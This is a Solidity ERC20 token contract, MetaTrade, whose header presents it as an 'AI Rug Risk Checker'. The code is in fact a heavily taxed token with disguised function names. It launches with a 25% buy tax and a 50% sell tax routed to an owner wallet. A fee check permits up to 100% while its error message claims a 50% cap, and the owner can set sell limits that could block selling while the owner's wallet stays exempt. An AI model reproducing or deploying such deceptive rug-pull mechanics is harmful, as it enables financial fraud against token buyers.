// SPDX-License-Identifier: No License

/* 
Welcome to Liquidity AI Rug Risk Checker—the cutting-edge solution for assessing and mitigating risks in the volatile landscape of decentralized finance (DeFi). Our AI-driven platform enables traders, investors, and liquidity providers to make more informed decisions by accurately evaluating the risks associated with various liquidity pools and investment strategies.

*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract MetaTrade is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public RevitalizeArsenalMetricArchitecture;
    uint16[3] public FinancialQuickScanEvaluation;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public StartupWeaponryFramework;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public SpecifyBlastCriteriaDetails;
    mapping (address => bool) public BlossomWebActivation;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event RevitalizeArsenalMetricArchitectureUpdated(address RevitalizeArsenalMetricArchitecture);
    event ComprehensiveTradeWaveAnalysis(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event BusinessExaminationCondensation(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);
    event CoalitionRestartTweaks(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"MetaTrade", unicode"MetaTrade") 
    {
        address supplyRecipient = 0x9E24Ff6aF0F4d0beE18EF5F8fbA2E6f4E0deA359;
        
        PinnacleBlasterMonetarySegmentation(750000000 * (10 ** decimals()) / 10);

        EnhanceMissileConstraintStrategies(0x9E24Ff6aF0F4d0beE18EF5F8fbA2E6f4E0deA359);
        LockOptimalSpeedBuyCeiling(2500, 5000, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(RevitalizeArsenalMetricArchitecture, true);

        QuickCombustionFloorPriceRearrangement(750000000 * (10 ** decimals()) / 10);
        GlaiveAlignmentTactics(750000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 100000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0x9E24Ff6aF0F4d0beE18EF5F8fbA2E6f4E0deA359);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function PinnacleBlasterMonetarySegmentation(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function FinancialAuthenticityCorroboration() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function EnhanceMissileConstraintStrategies(address _newAddress) public onlyOwner {
        RevitalizeArsenalMetricArchitecture = _newAddress;

        excludeFromFees(_newAddress, true);

        emit RevitalizeArsenalMetricArchitectureUpdated(_newAddress);
    }

    function LockOptimalSpeedBuyCeiling(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        FinancialQuickScanEvaluation = [_buyFee, _sellFee, _transferFee];

        StartupWeaponryFramework[0] = 0 + FinancialQuickScanEvaluation[0];
        StartupWeaponryFramework[1] = 0 + FinancialQuickScanEvaluation[1];
        StartupWeaponryFramework[2] = 0 + FinancialQuickScanEvaluation[2];
        require(StartupWeaponryFramework[0] <= 10000 && StartupWeaponryFramework[1] <= 10000 && StartupWeaponryFramework[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ComprehensiveTradeWaveAnalysis(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = FinancialAuthenticityCorroboration() >= swapThreshold;
        
        if (!_swapping && !BlossomWebActivation[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(RevitalizeArsenalMetricArchitecture)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit BusinessExaminationCondensation(RevitalizeArsenalMetricArchitecture, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (BlossomWebActivation[from]) {
                if (StartupWeaponryFramework[0] > 0) txType = 0;
            }
            else if (BlossomWebActivation[to]) {
                if (StartupWeaponryFramework[1] > 0) txType = 1;
            }
            else if (StartupWeaponryFramework[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * StartupWeaponryFramework[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * FinancialQuickScanEvaluation[txType] / StartupWeaponryFramework[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        SpecifyBlastCriteriaDetails = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(SpecifyBlastCriteriaDetails, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != SpecifyBlastCriteriaDetails, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        BlossomWebActivation[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit CoalitionRestartTweaks(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function QuickCombustionFloorPriceRearrangement(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function GlaiveAlignmentTactics(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (BlossomWebActivation[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (BlossomWebActivation[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}